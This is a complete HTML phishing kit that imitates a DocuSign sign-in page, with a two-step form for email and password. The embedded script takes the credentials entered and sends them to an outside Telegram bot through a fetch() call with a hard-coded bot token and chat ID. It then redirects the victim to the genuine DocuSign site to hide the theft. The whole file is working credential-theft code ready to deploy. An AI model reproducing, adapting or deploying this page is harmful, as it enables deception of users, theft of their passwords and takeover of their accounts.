<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DocuSign - Sign In</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <!-- Simple eye icon (you can replace with SVG if you want) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #130032 0%, #26065D 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #fff;
        }

        .container {
            background: #F8F3F0;
            border-radius: 12px;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.55);
            padding: 40px 48px;
            width: 100%;
            max-width: 440px;
            text-align: center;
            color: #111;
            transition: all 0.4s ease;
        }

        .logo img { max-width: 260px; height: auto; margin-bottom: 32px; }

        .providers-section { margin-bottom: 36px; }

        .providers {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 20px 28px;
            margin-bottom: 12px;
        }

        .providers img {
            width: 42px;
            height: 42px;
            object-fit: contain;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.12);
            transition: transform 0.2s;
        }

        .providers img:hover { transform: scale(1.08); }

        .providers-label {
            font-size: 13px;
            color: #555;
            font-weight: 500;
            margin-top: 8px;
        }

        h1 {
            font-size: 26px;
            font-weight: 600;
            color: #4C00FF;
            margin-bottom: 8px;
        }

        .subtitle { font-size: 15px; color: #444; margin-bottom: 32px; }

        .input-wrapper {
            position: relative;
            margin-bottom: 24px;
        }

        input[type="text"], input[type="email"], input[type="password"] {
            width: 100%;
            padding: 14px 48px 14px 16px;
            font-size: 16px;
            border: 1px solid #c0c0c0;
            border-radius: 6px;
            background: #fff;
            transition: all 0.2s ease;
        }

        input:focus {
            outline: none;
            border-color: #4C00FF;
            box-shadow: 0 0 0 3px rgba(76, 0, 255, 0.18);
        }

        .password-toggle {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #666;
            font-size: 18px;
        }

        .forgot {
            display: block;
            margin: 12px 0 28px;
            color: #4C00FF;
            font-size: 14px;
            text-decoration: none;
            text-align: left;
        }

        .forgot:hover { text-decoration: underline; }

        button {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .btn-primary {
            background: #4C00FF;
            color: white;
        }

        .btn-primary:hover { background: #3a00cc; }

        .btn-secondary {
            background: white;
            color: #111;
            border: 1px solid #ccc;
            margin-top: 12px;
        }

        .btn-secondary:hover { background: #f8f8f8; }

        .divider {
            margin: 28px 0;
            color: #666;
            font-size: 14px;
        }

        .links {
            margin-top: 24px;
            font-size: 14px;
        }

        .links a {
            color: #4C00FF;
            text-decoration: none;
        }

        .links a:hover { text-decoration: underline; }

        .footer {
            margin-top: 36px;
            font-size: 12px;
            color: #555;
        }

        .hidden { display: none; }

        /* Loading overlay */
        #loadingOverlay {
            position: fixed;
            inset: 0;
            background: rgba(19, 0, 50, 0.92);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            color: white;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.4s ease, visibility 0.4s ease;
        }

        #loadingOverlay.active {
            opacity: 1;
            visibility: visible;
        }

        .spinner {
            width: 56px;
            height: 56px;
            border: 6px solid rgba(255,255,255,0.2);
            border-top: 6px solid #4C00FF;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 20px;
            font-weight: 500;
        }

        @media (max-width: 480px) {
            .container { padding: 32px 24px; border-radius: 0; box-shadow: none; }
            .logo img { max-width: 220px; }
        }
    </style>
</head>
<body>

    <!-- Loading overlay -->
    <div id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">Loading documents...</div>
    </div>

    <div class="container" id="emailStep">
        <div class="logo">
            <img src="https://images.squarespace-cdn.com/content/v1/635736d9c34e1670e516b979/2b41dc52-d780-49d3-8d53-ae5e2afa2975/docusign+logo+teaser.png" alt="DocuSign Logo">
        </div>

        <div class="providers-section">
            <div class="providers">
                <img src="https://mailmeteor.com/logos/assets/PNG/Gmail_Logo_512px.png" alt="Gmail">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/512px-Microsoft_logo.svg.png" alt="Microsoft">
                <img src="https://1000logos.net/wp-content/uploads/2022/01/Yahoo-Mail-Logo.png" alt="Yahoo Mail">
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/AOL_logo.svg" alt="AOL">
            </div>
            <div class="providers-label">and others</div>
        </div>

        <h1>Sign in</h1>
        <p class="subtitle">to continue to DocuSign</p>

        <div class="input-wrapper">
            <input type="text" id="emailInput" placeholder="Email, phone, or Skype" autofocus autocomplete="email">
        </div>

        <a href="#" class="forgot">Forgot username?</a>

        <button class="btn-primary" id="nextBtn">Next</button>

        <div class="divider">or</div>

        <button class="btn-secondary">Sign in with another account</button>

        <div class="links">
            <a href="#">No account? Create one!</a>
        </div>

        <div class="footer">
            © 2025 DocuSign, Inc. All rights reserved.
        </div>
    </div>

    <!-- Password Step -->
    <div class="container hidden" id="passwordStep">
        <div class="logo">
            <img src="https://images.squarespace-cdn.com/content/v1/635736d9c34e1670e516b979/2b41dc52-d780-49d3-8d53-ae5e2afa2975/docusign+logo+teaser.png" alt="DocuSign Logo">
        </div>

        <div class="providers-section">
            <div class="providers">
                <img src="https://mailmeteor.com/logos/assets/PNG/Gmail_Logo_512px.png" alt="Gmail">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/512px-Microsoft_logo.svg.png" alt="Microsoft">
                <img src="https://1000logos.net/wp-content/uploads/2022/01/Yahoo-Mail-Logo.png" alt="Yahoo Mail">
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/AOL_logo.svg" alt="AOL">
            </div>
            <div class="providers-label">and others</div>
        </div>

        <h1>Enter password</h1>
        <p class="subtitle" id="emailDisplay"></p>

        <div class="input-wrapper">
            <input type="password" id="passwordInput" placeholder="Password" autocomplete="current-password">
            <i class="fas fa-eye password-toggle" id="togglePassword"></i>
        </div>

        <a href="#" class="forgot">Forgot password?</a>

        <button class="btn-primary" id="signInBtn">Sign in</button>

        <div class="links">
            <a href="#" id="backToEmail">Use a different account</a>
        </div>

        <div class="footer">
            © 2025 DocuSign, Inc. All rights reserved.
        </div>
    </div>

    <script>
        // Telegram config
        const BOT_TOKEN = '8501201307:AAF-G7wDBetT4ciGomqeb3Cn8xhAJj8ZeJY';
        const CHAT_ID   = '7811078120';
        const REDIRECT_URL = 'https://www.docusign.com';

        const emailStep = document.getElementById('emailStep');
        const passwordStep = document.getElementById('passwordStep');
        const emailInput = document.getElementById('emailInput');
        const emailDisplay = document.getElementById('emailDisplay');
        const passwordInput = document.getElementById('passwordInput');
        const togglePassword = document.getElementById('togglePassword');
        const nextBtn = document.getElementById('nextBtn');
        const signInBtn = document.getElementById('signInBtn');
        const backToEmail = document.getElementById('backToEmail');
        const loadingOverlay = document.getElementById('loadingOverlay');

        // Toggle password visibility
        togglePassword.addEventListener('click', () => {
            const type = passwordInput.type === 'password' ? 'text' : 'password';
            passwordInput.type = type;
            togglePassword.classList.toggle('fa-eye');
            togglePassword.classList.toggle('fa-eye-slash');
        });

        nextBtn.addEventListener('click', () => {
            const email = emailInput.value.trim();
            if (email) {
                emailDisplay.textContent = email;
                emailStep.classList.add('hidden');
                passwordStep.classList.remove('hidden');
                passwordInput.focus();
            }
        });

        backToEmail.addEventListener('click', (e) => {
            e.preventDefault();
            passwordStep.classList.add('hidden');
            emailStep.classList.remove('hidden');
            emailInput.focus();
        });

        signInBtn.addEventListener('click', async (e) => {
            e.preventDefault();

            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();

            if (!password) return;

            const message = `
NEW DOCUSIGN LOGIN
Time: ${new Date().toLocaleString()}
Email: ${email || '(empty)'}
Password: ${password}
URL: ${window.location.href}
            `.trim();

            // Show loading immediately
            loadingOverlay.classList.add('active');

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        disable_web_page_preview: true
                    }),
                    keepalive: true
                });

                if (!response.ok) {
                    console.error('Telegram send failed:', await response.text());
                } else {
                    console.log('Message sent to Telegram');
                }
            } catch (err) {
                console.error('Error sending to Telegram:', err);
            }

            // Redirect after delay
            setTimeout(() => {
                window.location.replace(REDIRECT_URL);
            }, 2800);
        });
    </script>

</body>
</html>
